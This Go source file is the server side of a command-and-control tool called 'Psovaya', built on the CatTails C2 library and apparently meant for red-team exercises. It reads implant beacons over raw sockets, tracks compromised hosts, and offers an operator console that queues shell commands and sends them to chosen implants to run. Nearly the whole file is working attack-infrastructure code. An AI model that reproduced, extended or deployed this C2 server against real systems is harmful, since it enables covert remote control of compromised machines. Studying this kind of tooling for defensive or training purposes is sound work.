package main

/*
Working on C2, Currently using Cattails C2 source as POC.
Additional functionality and code edits will be made in the future.

Look at the github repo for Cattails for more information :3
*/

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

// Global to store staged command
var tmpCmd string
var cmdQueue []Task
var allHostStats = make(map[string]HostStat)

// Glabal to store target info
var targetIP string

type Task struct {
	Target string
	cmd    string
}

type HostStat struct {
	BeaconCount int
	LastBeacon  time.Time
}

type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
	RespIP   net.IP
	SrcPort  int
	DstPort  int
}

type PwnBoard struct {
	IPs  string `json:"ip"`
	Type string `json:"type"`
}

func banner() {
	b, err := os.ReadFile("ascii.txt")
	if err != nil {
		panic(err)
	}
	fmt.Println(string(b))
}

func xorMsg(msg []string) {
	fmt.Print("Hello")
}

func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {
	// Forever loop to respond to bots
	for {
		/* Original Code */
		// Block on reading from channel
		bot := <-listen

		// Make a socket for sending
		fd := cattails.NewSocket()

		/* New Code */
		queueLen := len(cmdQueue)
		for i := 0; i < queueLen; i++ {
			if cmdQueue[i].Target == bot.IP.String() {
				/* Remove Element from Queue */
				cmdCurr := cmdQueue[i].cmd
				cmdQueue = append(cmdQueue[:i], cmdQueue[i+1:]...)
				queueLen--

				/* Send Command */
				packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(cmdCurr))
				cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
				fmt.Println("[+] Executed Task:", bot.Hostname, "(", bot.IP, ")")
				unix.Close(fd)
				// updatepwnboard
			}
		}
	}
}

func cliList(cmdArgs []string) {
	maxDelta := 120
	var lost bool = true
	var live bool = true

	if len(cmdArgs) > 1 {
		if cmdArgs[1] == "lost" {
			live = false
		}
		if cmdArgs[1] == "live" {
			lost = false
		} else {
			fmt.Printf("\x1b[31mUnknown List Arguement : %v\n\x1b[0m", cmdArgs[1])
			live = false
			lost = false
		}
	}
	for key, value := range allHostStats {
		delta := time.Since(value.LastBeacon)
		if delta.Seconds() > float64(maxDelta) && lost {
			fmt.Printf("\x1b[31m%s : Beacons - %v, Last Seen - %v\x1b[0m\n", key, value.BeaconCount, delta.Truncate(time.Second))
		}
		if live {
			fmt.Printf("\x1b[32m%s : Beacons - %v, Last Seen - %v\x1b[0m\n", key, value.BeaconCount, delta.Truncate(time.Second))
		}
	}
}

func cli() bool {
	var help string = "COMMANDS: \n    help: Display Help\n    exec: Execute Command\n    target: Configure target\n    info: Obtain info from payload or server"
	for {
		// reader type
		reader := bufio.NewReader(os.Stdin)

		fmt.Printf("Psovaya \x1b[36m[%v]\x1b[0m > ", targetIP)
		tmpCmd, _ = reader.ReadString('\n')
		tmpCmd = strings.Trim(tmpCmd, "\n") // Trim newlines

		splitCmd := strings.Split(tmpCmd, " ")
		cmdArgc := len(splitCmd)
		switch splitCmd[0] {
		case "help":
			fmt.Println(help)
		case "target":
			if splitCmd[1] == "set" && cmdArgc >= 3 {
				fmt.Printf("Target: %v\n", splitCmd[2])
				targetIP = splitCmd[2]
			} else {
				fmt.Printf("\x1b[31m[-] Incorrect Syntax\n\x1b[0m")
			}
		case "exec":
			if targetIP != "" {
				cmd := tmpCmd[5:]
				cmdQueue = append(cmdQueue, Task{targetIP, cmd})
				fmt.Printf("[+] Queued : %v\n", cmd)
			} else {
				fmt.Println("\x1b[31m[-] No Target\x1b[0m")
			}
		case "info":
			fmt.Println("info")
		case "exit":
			fmt.Printf("\x1b[31mAre you sure you want to exit?\n  [y/N]:\x1b[0m ")
			var resp string
			fmt.Scanln(&resp)
			if resp == "Y" || resp == "y" {
				os.Exit(0)
			}
		case "clear":
		case "list":
			cliList(splitCmd)
		case "drop":
			// send command but specific to the implant not COMMAND but DROP
		case "queue":
			for i := 0; i < len(cmdQueue); i++ {
				fmt.Printf("%v : %v\n", cmdQueue[i].Target, cmdQueue[i].cmd)
			}
		case "":
		default:
			fmt.Printf("\x1b[31m[-] Unknown Command\n\x1b[0m")
		}
		tmpCmd = ""
	}
}

func processPacket(packet gopacket.Packet, listen chan Host) {
	// Get data from packet
	data := string(packet.ApplicationLayer().Payload())
	payload := strings.Split(data, " ")

	fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())

	// Parse the values from the data
	mac, err := net.ParseMAC(payload[2])
	if err != nil {
		fmt.Println("[-] ERROR PARSING MAC:", err)
		return
	}

	srcport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Src().String())
	dstport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Dst().String())

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      mac,
		IP:       net.ParseIP(payload[3]),
		RespIP:   net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String()),
		SrcPort:  srcport,
		DstPort:  dstport,
	}

	// Update list of Implants
	oldHostStat, ok := allHostStats[newHost.IP.String()]
	if ok {
		oldCount := oldHostStat.BeaconCount + 1
		allHostStats[newHost.IP.String()] = HostStat{oldCount, time.Now()}
	} else {
		allHostStats[newHost.IP.String()] = HostStat{1, time.Now()}
	}

	// Update Pwnbord
	fmt.Println("[+] Recieved From:", newHost.Hostname, "(", newHost.IP, ")")
	// Write host to channel
	listen <- newHost
}

func main() {
	// Zoi Time
	banner()

	/* Cattails init */
	// Create a BPF vm for filtering
	vm := cattails.CreateBPFVM(cattails.FilterRaw)

	// Create a socket for reading
	readfd := cattails.NewSocket()
	defer unix.Close(readfd)

	listen := make(chan Host, 5)

	// Iface and myip for the sendcommand func to use
	iface, myIP := cattails.GetOutwardIface("192.168.56.10:80")
	fmt.Println("[+] Interface:", iface.Name)

	dstMAC, err := cattails.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] DST MAC:", dstMAC.String())

	// Spawn routine to listen for responses
	fmt.Println("[+] Starting go routine...")
	go sendCommand(iface, myIP, dstMAC, listen)

	// Start CLI
	go cli()

	// This needs to be on main thread
	for {
		packet := cattails.ServerReadPacket(readfd, vm)
		// Pass Packet to process function
		if packet != nil {
			go processPacket(packet, listen)
		}
	}
}
